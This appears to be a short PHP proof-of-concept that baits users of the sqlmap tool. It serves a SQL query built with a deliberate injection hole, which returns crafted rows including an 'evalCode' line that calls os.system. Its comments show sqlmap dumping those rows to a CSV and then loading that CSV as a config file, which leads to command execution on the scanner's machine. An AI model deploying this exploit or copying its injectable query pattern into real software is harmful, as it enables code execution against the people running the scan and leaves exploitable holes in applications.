<?php
//http://example.com/payload.php?0=1 --dump -C [Request] -T z --dbms=SQLite --answer=Y --technique=U

$d = new SQLite3(":memory:");
$d->exec("CREATE TABLE z('[Request]' TEXT)");
$d->exec("INSERT INTO z VALUES ('PAYLOAD1'),('PAYLOAD2'),('PAYLOAD3')");
$d->exec("CREATE TABLE x(id INTEGER, tx TEXT)");
$d->exec("INSERT INTO x VALUES (1,'a'),(2,'b')");

if(isset($_GET[0])){
	/*
	$f = fopen("log.txt","a");
	fwrite($f, $_GET[0]."\n");
	fclose($f);
	*/
	$r = $d->query("SELECT tx FROM x WHERE id=".$_GET[0]);
	while($o = $r->fetchArray()) {
    	echo str_replace(["PAYLOAD1","PAYLOAD2","PAYLOAD3"],["evalCode=__import__('os').system('/proof*')","[Target]","url=http://example.com/"],$o[0])."<br>";
	}
}

//-c /home/sqlmap/.local/share/sqlmap/output/example.com/dump/SQLite_masterdb/z.csv